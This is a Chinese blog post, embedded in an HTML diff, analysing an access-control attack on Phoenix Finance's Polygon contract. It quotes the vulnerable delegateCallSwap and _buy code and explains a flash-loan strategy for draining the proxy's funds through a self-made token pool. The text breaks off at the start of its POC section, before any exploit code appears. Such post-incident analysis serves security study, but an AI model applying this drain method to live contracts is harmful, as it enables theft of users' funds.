@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Phoenix 访问控制攻击分析 - YINHUI&#39;s BLOG</title><meta name="Description" content="银辉的博客"><meta property="og:title" content="Phoenix 访问控制攻击分析" />
+<meta property="og:description" content="Phoenix Finance 的智能合约访问控制不严格导致的一次攻击" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yinhui1984.github.io/phoenix-access-control-attack/" /><meta property="og:image" content="https://yinhui1984.github.io/avatar.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-15T14:50:48+08:00" />
+<meta property="article:modified_time" content="2023-03-15T14:50:48+08:00" /><meta property="og:site_name" content="YINHUI&#39;s BLOG" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yinhui1984.github.io/avatar.png"/>
+
+<meta name="twitter:title" content="Phoenix 访问控制攻击分析"/>
+<meta name="twitter:description" content="Phoenix Finance 的智能合约访问控制不严格导致的一次攻击"/>
+<meta name="application-name" content="YINHUI&#39;s BLOG">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://yinhui1984.github.io/phoenix-access-control-attack/" /><link rel="prev" href="https://yinhui1984.github.io/uniswap/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Phoenix 访问控制攻击分析",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yinhui1984.github.io\/phoenix-access-control-attack\/"
+        },"genre": "posts","keywords": "defi","wordcount":  2044 ,
+        "url": "https:\/\/yinhui1984.github.io\/phoenix-access-control-attack\/","datePublished": "2023-03-15T14:50:48+08:00","dateModified": "2023-03-15T14:50:48+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "yinhui"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="YINHUI&#39;s BLOG"></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/"> 首页 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="YINHUI&#39;s BLOG"></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/" title="">首页</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Phoenix 访问控制攻击分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/yinhui1984" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>yinhui</a></span>&nbsp;<span class="post-category">included in <a href="/categories/security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-15">2023-03-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2044 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#概述">概述</a></li>
+    <li><a href="#代码分析">代码分析</a></li>
+    <li><a href="#攻击流程">攻击流程</a></li>
+    <li><a href="#poc">POC</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Phoenix Finance 的智能合约访问控制不严格导致的一次攻击</p>
+<h2 id="概述">概述</h2>
+<p><a href="https://twitter.com/HypernativeLabs/status/1633090456157401088" target="_blank" rel="noopener noreffer ">https://twitter.com/HypernativeLabs/status/1633090456157401088</a></p>
+<p>故事发生在 polygon 链上的 <a href="https://polygonscan.com/block/40067323" target="_blank" rel="noopener noreffer ">40067323</a> 高度</p>
+<p>tx: <a href="https://polygonscan.com//tx/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4" target="_blank" rel="noopener noreffer ">0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4</a></p>
+<p>攻击流程参考: <a href="https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4" target="_blank" rel="noopener noreffer ">https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4</a></p>
+<h2 id="代码分析">代码分析</h2>
+<p>Phoenix Finance 有一个代理合约 <a href="https://polygonscan.com/address/0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de#code" target="_blank" rel="noopener noreffer ">0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de</a></p>
+<p>对应的逻辑合约为 <strong><a href="https://polygonscan.com/address/0x6d68beb09ea7e76d561ea8c4aac34a6611dd9821#code" target="_blank" rel="noopener noreffer ">0x6d68beb09ea7e76d561ea8c4aac34a6611dd9821</a></strong></p>
+<p>逻辑合约中有这样一个<code>public</code>函数叫做<code>delegateCallSwap</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">delegateCallSwap</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="nb">data</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">returnData</span><span class="p">)</span> <span class="o">=</span> <span class="n">phxSwapLib</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assembly</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">if</span> <span class="nf">eq</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">revert</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">returnData</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="nf">returndatasize</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">return</span> <span class="n">returnData</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中 <code>phxSwapLib</code> 可以从<a href="https://polygonscan.com/address/0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de#readProxyContract" target="_blank" rel="noopener noreffer ">代理合约</a>上读出值为 : <a href="https://polygonscan.com/address/0x95620f30263ac0b0b4ffd9b7465838084e89cb84#code" target="_blank" rel="noopener noreffer ">0x95620f30263ac0b0B4FFd9B7465838084e89cB84</a></p>
+<p>它是一个<code>UniSwapRouter</code> , 包含了一个<code>swap()</code>函数,用于在指定的router上进行token swap</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span><span class="kt">address</span> <span class="n">swapRouter</span><span class="p">,</span><span class="kt">address</span> <span class="n">token0</span><span class="p">,</span><span class="kt">address</span> <span class="n">token1</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">amountSell</span><span class="p">)</span> <span class="k">payable</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">_swap</span><span class="p">(</span><span class="n">swapRouter</span><span class="p">,</span><span class="n">token0</span><span class="p">,</span><span class="n">token1</span><span class="p">,</span><span class="n">amountSell</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>梳理一下便可以得到下面的逻辑</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/yinhui1984/imagehosting/blob/main/images/1678867288807757000.png?raw=true"
+        data-srcset="https://github.com/yinhui1984/imagehosting/blob/main/images/1678867288807757000.png?raw=true, https://github.com/yinhui1984/imagehosting/blob/main/images/1678867288807757000.png?raw=true 1.5x, https://github.com/yinhui1984/imagehosting/blob/main/images/1678867288807757000.png?raw=true 2x"
+        data-sizes="auto"
+        alt="https://github.com/yinhui1984/imagehosting/blob/main/images/1678867288807757000.png?raw=true"
+        title="image" /></p>
+<p>也就是说, 任何人都可以以代理合约(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de)为上下文进行代币置换.</p>
+<blockquote>
+<p>那么, 如果我有很多自己的创建的ERC20代币(MYTOKEN), 并以该ERC20代币创建一个交易池(Uniwswap Pair)</p>
+<p><strong>并且如果刚好代理合约又很有钱</strong>, 那么我就可以让代理合约用真金白银来置换我们不值钱的MYTOKEN, 代理合约的钱就将会被置换到我们的交易池中, 然后我们再用一堆不值钱的MYTOKEN从交易池中将代理合约刚刚置换MYTOKEN的钱置换出来. 钱就到我们手中了.</p>
+</blockquote>
+<p>可惜的是代理合约现在没钱(只有 0.000000000423个WETH)</p>
+<p>如何让代理合约有钱?</p>
+<p>在逻辑合约代码中有一个 <code>buyLeverage</code>函数, 用于用户购买Leverage Token , 也就是<a href="https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4" target="_blank" rel="noopener noreffer ">攻击流程</a>中看到的WETH_BULL_X3这个币</p>
+<p><code>buyLeverage</code>函数调用的<code>_buy</code>函数如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_buy</span><span class="p">(</span><span class="n">leverageInfo</span> <span class="k">memory</span> <span class="n">coinInfo</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">minAmount</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">deadLine</span><span class="p">,</span><span class="kt">bool</span> <span class="n">bFirstToken</span><span class="p">)</span> <span class="n">ensure</span><span class="p">(</span><span class="n">deadLine</span><span class="p">)</span> <span class="n">notHalted</span> <span class="n">nonReentrant</span> <span class="n">getUnderlyingPrice</span> <span class="k">internal</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">inputToken</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">bFirstToken</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">inputToken</span> <span class="o">=</span> <span class="n">coinInfo</span><span class="p">.</span><span class="n">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">inputToken</span> <span class="o">=</span> <span class="p">(</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">id</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="n">hedgeCoin</span><span class="p">.</span><span class="n">token</span> <span class="o">:</span> <span class="n">leverageCoin</span><span class="p">.</span><span class="n">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">amount</span> <span class="o">=</span> <span class="n">getPayableAmount</span><span class="p">(</span><span class="n">inputToken</span><span class="p">,</span><span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;buy amount is zero&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">userPay</span> <span class="o">=</span> <span class="n">amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">amount</span> <span class="o">=</span> <span class="n">redeemFees</span><span class="p">(</span><span class="n">buyFee</span><span class="p">,</span><span class="n">inputToken</span><span class="p">,</span><span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">price</span> <span class="o">=</span> <span class="n">_tokenNetworthBuy</span><span class="p">(</span><span class="n">coinInfo</span><span class="p">,</span><span class="n">currentPrice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">leverageAmount</span> <span class="o">=</span> <span class="n">bFirstToken</span> <span class="o">?</span> <span class="n">amount</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">calDecimal</span><span class="p">)</span><span class="o">/</span><span class="n">price</span> <span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">amount</span><span class="p">.</span><span class="n">mulPrice</span><span class="p">(</span><span class="n">currentPrice</span><span class="p">,</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">id</span><span class="p">)</span><span class="o">/</span><span class="n">price</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">leverageAmount</span><span class="o">&gt;=</span><span class="n">minAmount</span><span class="p">,</span><span class="s">&#34;token amount is less than minAmount&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">userLoan</span> <span class="o">=</span> <span class="p">(</span><span class="n">leverageAmount</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">rebalanceWorth</span><span class="p">)</span><span class="o">/</span><span class="n">calDecimal</span><span class="p">).</span><span class="n">mul</span><span class="p">(</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">leverageRate</span><span class="o">-</span><span class="n">feeDecimal</span><span class="p">)</span><span class="o">/</span><span class="n">feeDecimal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">userLoan</span> <span class="o">=</span> <span class="n">coinInfo</span><span class="p">.</span><span class="n">stakePool</span><span class="p">.</span><span class="n">borrow</span><span class="p">(</span><span class="n">userLoan</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">amount</span> <span class="o">=</span> <span class="n">bFirstToken</span> <span class="o">?</span> <span class="n">userLoan</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span> <span class="o">:</span> <span class="n">userLoan</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//98%
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">uint256</span> <span class="n">amountOut</span> <span class="o">=</span> <span class="n">amount</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="mi">98</span><span class="n">e16</span><span class="p">).</span><span class="n">divPrice</span><span class="p">(</span><span class="n">currentPrice</span><span class="p">,</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span> <span class="n">token1</span> <span class="o">=</span> <span class="p">(</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">id</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="n">hedgeCoin</span><span class="p">.</span><span class="n">token</span> <span class="o">:</span> <span class="n">leverageCoin</span><span class="p">.</span><span class="n">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">amount</span> <span class="o">=</span> <span class="n">_swap</span><span class="p">(</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">token</span><span class="p">,</span><span class="n">token1</span><span class="p">,</span><span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">amount</span><span class="o">&gt;=</span><span class="n">amountOut</span><span class="p">,</span> <span class="s">&#34;swap slip page is more than 2%&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">coinInfo</span><span class="p">.</span><span class="n">leverageToken</span><span class="p">.</span><span class="n">mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span><span class="n">leverageAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">price</span> <span class="o">=</span> <span class="n">price</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">currentPrice</span><span class="p">[</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">id</span><span class="p">])</span><span class="o">/</span><span class="n">calDecimal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">coinInfo</span><span class="p">.</span><span class="n">id</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">emit</span> <span class="n">BuyLeverage</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span><span class="n">inputToken</span><span class="p">,</span><span class="n">userPay</span><span class="p">,</span><span class="n">leverageAmount</span><span class="p">,</span><span class="n">price</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">emit</span> <span class="n">BuyHedge</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span><span class="n">inputToken</span><span class="p">,</span><span class="n">userPay</span><span class="p">,</span><span class="n">leverageAmount</span><span class="p">,</span><span class="n">price</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>userLoan = coinInfo.stakePool.borrow(userLoan); </code>该代码会向<a href="https://polygonscan.com/address/0xd0289082cf4c5c2ba448b4b9c67232729aa75efa#readProxyContract" target="_blank" rel="noopener noreffer ">另外一个代理合约</a>借钱到本代理合约. 我没搞清楚这是在干嘛. 但反正用户向代理合约购买Leverage Token后, 代理合约会得到两笔USDC: 用户付款的USDC以及调用coinInfo.stakePool.borrow()借来的USDC, 并且其会将这些USDC都转换为WETH</p>
+<blockquote>
+<p>所以, 为了让代理合约有钱置换我们的币, 我们花<code>X</code>向代理合约购买Leverage Token, 代理合约会收到的价值为 <code>X + Y</code> , <code>Y</code>是它向<a href="https://polygonscan.com/address/0xd0289082cf4c5c2ba448b4b9c67232729aa75efa#readProxyContract" target="_blank" rel="noopener noreffer ">另外一个代理合约</a>借来的</p>
+<p>然后我们让代理合约花  <code>X + Y</code> 全部拿来置换我们的币, 这样除去成本<code>X</code>, 我们能净赚<code>Y</code></p>
+</blockquote>
+<blockquote>
+<p>在本次攻击中, 黑客也没想花自己的钱, 所以他使用了闪电贷来支付购买Leverage Token的成本<code>X</code></p>
+</blockquote>
+<h2 id="攻击流程">攻击流程</h2>
+<p>到这里查看攻击流程 : <a href="https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4" target="_blank" rel="noopener noreffer ">https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4</a></p>
+<p>我总结了一下, 如下图, 每一行开头的数字对应攻击流程图中的行号</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/yinhui1984/imagehosting/blob/main/images/1678870443464770000.png?raw=true"
+        data-srcset="https://github.com/yinhui1984/imagehosting/blob/main/images/1678870443464770000.png?raw=true, https://github.com/yinhui1984/imagehosting/blob/main/images/1678870443464770000.png?raw=true 1.5x, https://github.com/yinhui1984/imagehosting/blob/main/images/1678870443464770000.png?raw=true 2x"
+        data-sizes="auto"
+        alt="https://github.com/yinhui1984/imagehosting/blob/main/images/1678870443464770000.png?raw=true"
+        title="image" /></p>
+<h2 id="poc">POC</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
